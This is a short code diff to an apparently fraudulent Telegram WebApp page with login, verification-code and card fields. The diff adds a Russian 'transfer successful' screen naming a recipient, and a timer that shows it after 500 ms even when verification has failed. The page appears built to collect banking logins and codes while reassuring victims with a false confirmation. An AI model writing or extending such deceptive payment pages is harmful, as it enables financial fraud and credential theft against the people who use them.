@@ -38,6 +38,12 @@
     <button id="verify-button" class="button-success">Продолжить</button>
     <button class="button-link">Отменить</button>
 </div>
+<div class="success-form hidden">
+    <img class="logo" src="success-logo.svg" />
+<div>
+    Поздравляем! Перевод <b>Анна Владимировна М. </b> успешно выполнен
+</div>
+</div>
 <script>
     var tg = window.Telegram.WebApp;
     var loginForm = document.querySelector('.login-form');
@@ -51,6 +57,7 @@
     var transSum = document.querySelector('#trans-sum')
     var visa = document.querySelector('.visa-card')
     var mc = document.querySelector('.mc-card')
+    var successform = document.querySelector('.success-form')
 
     function login() {
         setLoading(loginButton)
@@ -155,6 +162,10 @@
                 setError(verificationForm)
                 resetLoading(verifyButton)
             }
+            setTimeout(function () {
+            hideForm(verificationForm)
+            showForm(successform)
+        }, 500)
         })
     }
 
